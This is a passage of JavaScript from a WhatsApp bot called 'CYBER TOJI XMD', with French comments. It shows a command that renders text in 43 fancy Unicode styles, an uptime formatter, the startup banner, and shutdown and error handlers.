    // Style with map
    if (style.map) {
      return text.split('').map(c => style.map[c] || c).join('');
    }

    return text;
  }

  const TOTAL_STYLES = 43;

  // Un seul style demandé
  if (styleNum !== null && styleNum >= 1 && styleNum <= TOTAL_STYLES) {
    const result = applyStyle(text, styleNum - 1);
    await sock.sendMessage(remoteJid, {
      text: `✨ *Style ${styleNum}:*\n\n${result}`
    });
    return;
  }

  // Tous les styles — envoyer en un seul message
  const lines = [];
  for (let i = 1; i <= TOTAL_STYLES; i++) {
    try {
      const result = applyStyle(text, i - 1);
      lines.push(`*${i}.* ${result}`);
    } catch(e) {
      lines.push(`*${i}.* ${text}`);
    }
  }

  const output = `✨ *FANCY — ${text}*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n${lines.join('\n')}\n\n━━━━━━━━━━━━━━━━━━━━━━━\n_${config.prefix}fancy [1-${TOTAL_STYLES}] [texte] pour un style spécifique_`;

  await sock.sendMessage(remoteJid, { text: output });
}

function formatUptime(seconds) {
  const hours = Math.floor(seconds / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = Math.floor(seconds % 60);
  return `${hours}h ${minutes}m ${secs}s`;
}

// =============================================
// LANCEMENT DU BOT
// =============================================

console.log('╔══════════════════════════════╗');
console.log('║   𝐂𝐘𝐁𝐄𝐑 𝐓𝐎𝐉𝐈 𝐗𝐌𝐃 v3.5  ║');
console.log('╚══════════════════════════════╝\n');

connectToWhatsApp().catch(err => {
  console.error('Failed to start bot:', err);
  saveData();
  process.exit(1);
});

process.on('SIGINT', () => {
  console.log('\n\n👋 Bot shutting down...');
  saveData();
  process.exit(0);
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
  saveData();
});

process.on('unhandledRejection', (err) => {
  console.error('Unhandled Rejection:', err);
});
